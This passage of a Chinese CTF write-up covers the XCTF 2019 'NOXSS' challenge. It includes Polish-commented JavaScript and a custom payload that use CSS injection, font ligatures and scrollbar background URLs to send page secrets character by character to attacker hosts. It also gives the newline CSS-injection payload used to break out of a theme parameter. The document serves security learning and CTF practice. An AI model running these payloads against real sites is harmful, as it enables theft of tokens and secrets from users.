                // Wypiszmy w HTML-u jaki token jak na razie wyciągnęliśmy.
                outputElement.textContent = extractedToken;
            }
            // Jak dotarliśmy tutaj, to znaczy, że mamy cały token!
            // W ramach świętowania usuńmy wszystkie iframe'y i ustawmy
            // pogrubienie na tokenie widocznym w HTML-u ;-)
            deleteAllIframes();
            outputElement.style.fontWeight = 'bold';
            // Funkcja, której celem jest wydobycie następnego znaku tokena
            // metodą dziel i zwyciężaj.
            async function getNextTokenCharacter() {
                // Dla celów wydajnościowych - usuńmy wszystkie istniejące elementy iframe.
                deleteAllIframes();
                let alphabet = ALPHABET;
                // Wykonujemy operacje tak długo aż wydobędziemy informację
                // jaki jest następny znak tokena.
                while (alphabet.length > 1) {
                    // Będziemy oczekiwać na utworzenie nowego ciasteczka - najpierw więc
                    // usuńmy wszystkie istniejące.
                    clearAllCookies();
                    const [leftChars, rightChars] = split(alphabet);
                    // Najpierw upewniamy się, że fonty dla obu zestawów ligatur
                    // są w cache'u.
                    await makeSureFontsAreCached(leftChars, rightChars);
                    // Niestety - praktyczne testy pokazały, że wrzucenie w to miejsce
                    // sztucznego opóźnienia znacząco zwiększa prawdopodobieństwo, że atak
                    // po drodze się nie "wysypie"...
                    await delay(100);
                    // A potem tworzymy dwa iframe'y z "atakującym" CSS-em
                    await Promise.all([createAttackIframe(leftChars), createAttackIframe(rightChars)]);
                    // Czekamy na znaki z połączenia zwrotnego...
                    const chars = await getCharsFromReverseConnection();
                    // ... i na ich podstawie kontynuujemy "dziel i zwyciężaj".
                    alphabet = chars;
                }
                // Jeśli znaleźliśmy się w tym miejscu, to znaczy, że alphabet
                // ma jeden znak. Wniosek: ten jeden znak to kolejny znak tokena.
                return alphabet;
            }
            function clearAllCookies() {
                Object.keys(Cookies.get()).forEach(cookie => {
                    Cookies.remove(cookie);
                });
            }
            function deleteAllIframes() {
                document.querySelectorAll('iframe').forEach(iframe => {
                    iframe.parentNode.removeChild(iframe);
                });
            }
            // Funkcja dzieląca string na dwa stringi o tej
            // samej długości (lub różnej o jeden).
            // Np. split("abcd") == ["ab", "cd"];
            function split(s) {
                const halfLength = parseInt(s.length / 2);
                return [s.substring(0, halfLength), s.substring(halfLength)];
            }
            // Funkcja generująca losowego stringa, np.
            // randomValue() == "rand6226966173982633"
            function randomValue() {
                return "rand" + Math.random().toString().slice(2);
            }
            // Generujemy CSS-a, który zapewni nam, że fonty znajdą się w cache.
            // Jako dowód na to, że font został już pobrany, użyjemy sprawdzenia
            // czy ciasteczko font_${losowy_ciąg_znaków} zostało zdefiniowane.
            function makeSureFontsAreCached(leftChars, rightChars) {
                return new Promise(resolve => {
                    // Enkodujemy wszystkie wartości, by móc umieścić je bezpiecznie w URL-u.
                    let encodedPrefix;
                    [encodedPrefix, leftChars, rightChars] = [prefix, leftChars, rightChars].map(val => encodeURIComponent(val));
                    // Generujemy CSS-a odwołującego się do obu fontów. Używamy body:before i body:after
                    // by upewnić się, że przeglądarka będzie musiała oba fonty pobrać.
                    const css = `
                        @font-face {
                            font-family: 'hack1';
                            src: url(http://192.168.13.37:3001/font/${encodedPrefix}/${leftChars})
                        }
                        @font-face {
                            font-family: 'hack2';
                            src: url(http://192.168.13.37:3001/font/${encodedPrefix}/${rightChars})
                        }
                        body:before {
                            content: 'x';
                            font-family: 'hack1';
                        }
                        body:after {
                            content: 'x';
                            font-family: 'hack2';
                        }
                    `;
                    // Tworzymy iframe, w którym załadowane zostaną fonty
                    const iframe = document.createElement('iframe');
                    iframe.onload = () => {
                        // Funkcja zakończy swoje działanie dopiero gdy zostanie wyzwolone zdarzenie
                        // onload w elemencie iframe
                        resolve();
                    }
                    iframe.src = 'http://localhost:12345/?css=' + encodeURIComponent(css);
                    document.body.appendChild(iframe);
                })
            }
            // Jak wywołana zostaje ta funkcja, to już mamy pewność, że fonty
            // są w cache'u. Spróbujmy więc zaatakować z takim stylem, w wyniku
            // którego pojawi się pasek przewijania, jeśli trafiliśmy ze znakami
            // w tokenie.
            function createAttackIframe(chars) {
                return new Promise(resolve => {
                    // Enkodujemy wszystkie wartości, by móc umieścić je bezpiecznie w URL-u.
                    let encodedPrefix;
                    [encodedPrefix, chars] = [prefix, chars].map(val => encodeURIComponent(val));
                    const css = `
                    @font-face {
                        font-family: "hack";
                        src: url(http://192.168.13.37:3001/font/${encodedPrefix}/${chars})
                    }
                    script {
                        display: table;
                        font-family: "hack";
                        white-space: nowrap;
                    }
                    body::-webkit-scrollbar {
                        background: blue;
                    }
                    body::-webkit-scrollbar:horizontal {
                        background: blue url(http://192.168.13.37:3001/reverse/${chars});
                    }
                    `;
                    const iframe = document.createElement('iframe');
                    iframe.onload = () => {
                        resolve();
                    }
                    iframe.src = 'http://localhost:12345/?css=' + encodeURIComponent(css);
                    // Ten iframe musi być stosunkowo wąski - by pojawił się pasek przewijania.
                    iframe.style.width = "40px";
                    document.body.appendChild(iframe);
                })   
            }
            // Sprawdzamy co 20ms czy dostaliśmy połączenie zwrotne wygenerowane
            // przez pasek przewijania. Jeśli tak - to zwracamy wartość z ciasteczka chars.
            function getCharsFromReverseConnection() {
                return new Promise(resolve => {
                    const interval = setInterval(() => {
                        const chars = Cookies.get('chars');
                        if (chars) {
                            clearInterval(interval);
                            resolve(chars);
                        }
                    }, 20);
                })
            }
            async function delay(time) {
                return new Promise(resolve => {
                    setTimeout(resolve, time);
                })
            }
        })();
但是我没成功过2333...
# NOXSS
终于可以回到我们的题目了，其实走完以上流程，这个题目已经迎刃而解了，出题人出的点也正是 token2 的点。
随便注册一个账号之后，我们可以在 theme 参数发现有代码注入的地方，但是过滤了尖括号，我们可以用`%0a`进行换行
但是我们的最终目的跟 token2 场景类似，还是拿到 script 标签中的 secret 变量
根据 token2 场景的解法，接下来我们至少需要做到可以执行我们任意 css 代码才行。
根据文档[css newline](https://www.w3.org/TR/css-syntax-3/#newline-diagram)，我们可以知道换行有如下写法：
而且文档里也提到了[error-handling](https://www.w3.org/TR/css-syntax-3/#error-handling)
> ​ When errors occur in CSS, the parser attempts to recover gracefully,
> throwing away only the minimum amount of content before returning to parsing
> as normal. This is because errors aren’t always mistakes—new syntax looks
> like an error to an old parser, and it’s useful to be able to add new syntax
> to the language without worrying about stylesheets that include it being
> completely broken in older UAs.
css 兼容性比较强，对于错误的处理也比较宽松，这里由于自己的知识有限，也暂时没有找到 chrome 对于 css
错误处理相关的内容，但是经过我们不断尝试，我们可以发现使用如下 payload 可以任意执行我们的 css 代码：
    %0a){}body{background:red}%2f*
对于以上，问了 @zsx 师傅，以下是他的原话（ ~~你看看这是人说的吗~~ orz）：
> ​ 我wp写了，看了下w3c标准，再随便fuzz一下就ok了
我的理解是这里用`%0a`进行了换行，但是由于括号的解析还没结束，所以我们需要用`)`来将`import`的括号进行闭合，然后再用`{}`制定空样式，后面就可以任意注入
css 代码了。
如果有师傅看了 chromium 有非常硬核的理解，还望不吝赐教，带带我这个菜鸡。//感觉本文的关键点也不在这
然后我们就可以利用 token2 的方法，利用滚动条来 leak secret 了，只要自己做个 iframe 引用我们构造的 payload 即可，比如
        Document
            //const chars = ['t','f']
            const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_'.split('')
            let ff = [],
                data = ''
            let prefix = 'xctf{'
            chars.forEach(c => {
                var css = ''
                css = '?theme=../../../../\fa{}){}'
                css +=
                    `body{overflow-y:hidden;overflow-x:auto;white-space:nowrap;display:block}html{display:block}*{display:none}body::-webkit-scrollbar{display:block;background: blue url(http://172.16.71.138:9999/?${encodeURIComponent(prefix+c)})}`
                css += `@font-face{font-family:a${c.charCodeAt()};src:url(http://172.16.71.138:23460/font/${prefix}/${c});}`
                css += `script{font-family:a${c.charCodeAt()};display:block}`
                document.write(
                    '')
            })
这里我用 php 简单模拟了题目环境，做起来比较简便，也比较开心
And...
现场做出来的真是 CSS 带师 orz...
# Reference
[XCTF final 2019 Writeup By ROIS](https://xz.aliyun.com/t/6655#toc-5)
[通过CSS注入窃取HTML中的数据](https://www.smi1e.top/通过css注入窃取html中的数据/)
[Wykradanie danych w świetnym stylu – czyli jak wykorzystać CSS-y do ataków na
webaplikację](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)